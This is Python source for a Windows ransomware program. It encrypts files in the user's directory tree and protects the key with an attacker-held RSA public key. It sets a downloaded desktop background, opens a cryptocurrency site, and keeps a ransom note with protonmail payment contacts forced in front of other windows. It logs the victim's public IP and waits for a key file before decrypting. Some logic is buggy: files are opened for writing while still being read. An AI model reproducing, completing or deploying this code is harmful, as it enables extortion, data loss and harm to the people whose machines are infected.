import ctypes  # so we can intereact with windows dlls and change windows background etc
import datetime  # to give time limit on ransom note
import os  # to get system root
import subprocess  # to create process for notepad and open ransom  note
import sys  # used for command line parsing
import threading  # used for ransom note and decryption key on dekstop
import time  # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import urllib.request  # used for downloading and saving background image
import webbrowser  # to load webbrowser to go to specific website eg bitcoin

import requests  # used to make get reqeust to api.ipify.org to get target machine ip addr
import win32gui  # used to get window text to see if ransom note is on top of all other windows
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from cryptography.fernet import Fernet  # encrypt/decrypt files on target system


class RansomWare:
    # File exstensions to seek out and Encrypt
    valid_exts = ["exe", "jpg", "png"]  # TODO argparse for command line arguments
    file_exts = [arg] if (arg := sys.argv[1]) in valid_exts else valid_exts
    print(file_exts)

    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = Fernet.generate_key()
        # Encrypt/Decrypter
        self.crypter = Fernet(self.key)
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = RSA.import_key(open("public.pem").read())
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser("~")
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        currentDirectory = os.getcwd()
        self.localRoot = currentDirectory  # Debugging/Testing

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get("https://api.ipify.org").text

    # Write the fernet(symmetric key) to text file
    def write_key(self):
        with open("fernet_key.txt", "wb") as f:
            f.write(self.key)

    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encrypt_fernet_key(self):
        with (
            open("fernet_key.txt", "rb") as rfk,
            open("fernet_key.txt", "wb") as wfk,
            open(f"{self.sysRoot}\Desktop\EMAIL_ME.txt", "wb") as wfk_desktop,
        ):
            fernet_key = rfk.read()
            # Public encrypter object
            public_crypter = PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            wfk.write(enc_fernent_key)
            # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
            wfk_desktop.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, "rb") as rf, open(file_path, "wb") as wf:
            # Read data from file
            data = rf.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print("> File encrpyted")
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print("> File decrpyted")
                print(_data)
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            wf.write(_data)

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        for root, _, files in os.walk(self.localRoot, topdown=True):
            for file_path in (os.path.join(root, f) for f in files):
                _, file_ext = os.path.splitext(file_path)

                if file_ext not in self.file_exts:
                    continue

                self.crypt_file(file_path, encrypted=True) if encrypted else self.crypt_file(file_path)

    @staticmethod
    def what_is_dogecoin():
        """Open browser to the https://bitcoin.org so they know what bitcoin is"""
        webbrowser.open("https://dogecoin.com/")

    def change_desktop_background(self):
        """Go to specif url and download+save image using absolute path"""

        imageUrl = "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fi.imgur.com%2FGnqMTPa.png&f=1&nofb=1"
        path = f"{self.sysRoot}\Desktop\Background.jpg"

        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime("%d-%B-Y")
        with open("RANSOM_NOTE.txt", "w") as f:
            f.write(
                f"""
 _   _  _____ _   _______ _____ _   _ 
| \ | ||  ___| | | | ___ \  _  | \ | |
|  \| || |__ | | | | |_/ / | | |  \| |
| . ` ||  __|| | | |    /| | | | . ` |
| |\  || |___| |_| | |\ \  \_/ / |\  | {date}
\_| \_/\____/ \___/\_| \_|\___/\_| \_/ {self.publicIP}

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}\Desktop\EMAIL_ME.txt to gimmemymoney@protonmail.com

2. You will recieve your personal DOGE address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   [!] IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

-NEURON
"""
            )

    def show_ransom_note(self):
        """Displays the ransome note to the victim."""

        ransom = subprocess.Popen(["notepad.exe", "RANSOM_NOTE.txt"])

        while win32gui.GetWindowText(win32gui.GetForegroundWindow()) != "RANSOM_NOTE - Notepad":
            time.sleep(0.1)
            print("Ransom note is not the top window - kill/create process again")  # Debugging/Testing
            # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
            time.sleep(0.1)
            ransom.kill()
            # Open the ransom note
            time.sleep(0.1)
            ransom = subprocess.Popen(["notepad.exe", "RANSOM_NOTE.txt"])

            # sleep for 10 seconds
            time.sleep(30)

    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
    def put_me_on_desktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print("started")  # Debugging/Testing
        while True:
            try:
                print("trying")  # Debugging/Testing
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
                with open(f"{self.sysRoot}\Desktop\PUT_ME_ON_DESKTOP.txt", "r") as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print("decrypted")  # Debugging/Testing
                    break
            except Exception as e:
                print(e)  # Debugging/Testing
            time.sleep(5)
            # Sleep ~ 3 mins
            # secs = 60
            # mins = 3
            # time.sleep((mins*secs))


def main():
    rw = RansomWare()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_dogecoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print("> RansomWare: Attack completed on target machine and system is encrypted")  # Debugging/Testing
    print(
        "> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine"
    )  # Debugging/Testing
    t2.start()
    print("> RansomWare: Completed")  # Debugging/Testing


if __name__ == "__main__":
    main()
